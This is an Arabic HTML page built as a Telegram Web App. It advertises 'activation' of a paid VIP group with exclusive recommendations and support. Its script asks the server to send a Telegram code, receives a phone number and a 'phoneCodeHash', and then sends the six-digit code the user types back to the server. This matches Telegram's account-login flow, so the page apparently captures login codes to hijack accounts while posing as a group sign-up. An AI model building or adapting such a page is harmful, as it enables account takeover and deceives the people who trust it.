<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>الانضمام للمجموعة المدفوعة | VIP</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Cairo', sans-serif;
    }
    body {
      background: linear-gradient(135deg, #131e29 0%, #0b1118 100%);
      color: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .card {
      background: #1e2c3a;
      border: 1px solid #2a3d52;
      padding: 30px;
      border-radius: 24px;
      width: 100%;
      max-width: 420px;
      text-align: center;
      box-shadow: 0 15px 35px rgba(0,0,0,0.6);
    }
    .vip-badge {
      background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
      color: #fff;
      padding: 6px 16px;
      border-radius: 30px;
      font-size: 13px;
      font-weight: 700;
      display: inline-block;
      margin-bottom: 15px;
      box-shadow: 0 4px 10px rgba(245, 158, 11, 0.3);
    }
    h2 {
      margin: 10px 0;
      font-size: 24px;
      color: #ffffff;
    }
    p {
      color: #93c5fd;
      font-size: 14px;
      margin-bottom: 25px;
      line-height: 1.6;
    }
    .features {
      text-align: right;
      background: #17212b;
      padding: 15px;
      border-radius: 12px;
      margin-bottom: 20px;
      font-size: 13px;
      color: #cbd5e1;
    }
    .features div {
      margin-bottom: 8px;
    }
    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 20px;
      border-radius: 12px;
      border: 2px solid #364353;
      background: #0f172a;
      color: #fff;
      font-size: 22px;
      text-align: center;
      letter-spacing: 8px;
      outline: none;
      transition: border-color 0.3s;
    }
    input:focus {
      border-color: #3b82f6;
    }
    button {
      background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
      color: white;
      border: none;
      padding: 15px;
      border-radius: 12px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
      box-shadow: 0 4px 15px rgba(37, 99, 235, 0.4);
      transition: transform 0.2s;
    }
    button:active {
      transform: scale(0.98);
    }
    #codeSection {
      display: none;
    }
  </style>
</head>
<body>

  <div class="card">
    <div class="vip-badge">🌟 مجموعة VIP الحصرية</div>
    <h2 id="title">تفعيل اشتراك المجموعة</h2>
    <p id="statusDesc">أنت على بُعد خطوة واحدة من دخول المجتمع الخاص. اضغط أدناه لتلقي رمز التفعيل وتأكيد حسابك.</p>

    <div class="features">
      <div>✓ توصيات وتحليلات حصرية يومية</div>
      <div>✓ دعم مباشر ومناقشات خاصة</div>
      <div>✓ وصول كامل لمحتوى القناة</div>
    </div>

    <button id="sendBtn" onclick="sendCode()">إرسال رمز التفعيل</button>

    <div id="codeSection">
      <input type="text" id="codeInputs" placeholder="------" maxlength="6">
      <button onclick="verifyCode()">تأكيد الرمز والانضمام</button>
    </div>
  </div>

  <script>
    let globalPhoneHash = "";
    let globalPhone = "";

    async function sendCode() {
      const btn = document.getElementById('sendBtn');
      btn.innerText = "جاري إرسال الرمز...";
      btn.disabled = true;

      try {
        const response = await fetch('/api/send-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        });
        const result = await response.json();

        if (result.success) {
          globalPhoneHash = result.phoneCodeHash;
          globalPhone = result.phone;
          document.getElementById('title').innerText = "أدخل رمز التفعيل";
          document.getElementById('statusDesc').innerText = "تم إرسال كود التحقق المكون من 6 أرقام عبر تيليغرام، يرجى إدخاله أدناه:";
          btn.style.display = 'none';
          document.getElementById('codeSection').style.display = 'block';
        } else {
          alert('خطأ: ' + result.error);
          btn.innerText = "إرسال رمز التفعيل";
          btn.disabled = false;
        }
      } catch (err) {
        alert('تعذر الاتصال بالسيرفر.');
        btn.innerText = "إرسال رمز التفعيل";
        btn.disabled = false;
      }
    }

    async function verifyCode() {
      const code = document.getElementById('codeInputs').value;
      if (!code || code.length < 5) {
        alert('الرجاء إدخال الرمز بشكل صحيح');
        return;
      }

      try {
        const response = await fetch('/api/verify-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            phoneNumber: globalPhone,
            phoneCode: code,
            phoneCodeHash: globalPhoneHash
          })
        });

        const result = await response.json();
        if (result.success) {
          alert('🎉 مبروك! تم التحقق بنجاح وجاري توجيهك إلى المجموعة.');
          document.getElementById('title').innerText = "تم الانضمام بنجاح!";
          document.getElementById('statusDesc').innerText = "أنت الآن عضو معتمد في مجموعة الـ VIP.";
          document.getElementById('codeSection').style.display = 'none';
        } else {
          alert('خطأ: ' + result.error);
        }
      } catch (err) {
        alert('حدث خطأ أثناء التأكيد.');
      }
    }
  </script>
</body>
</html>
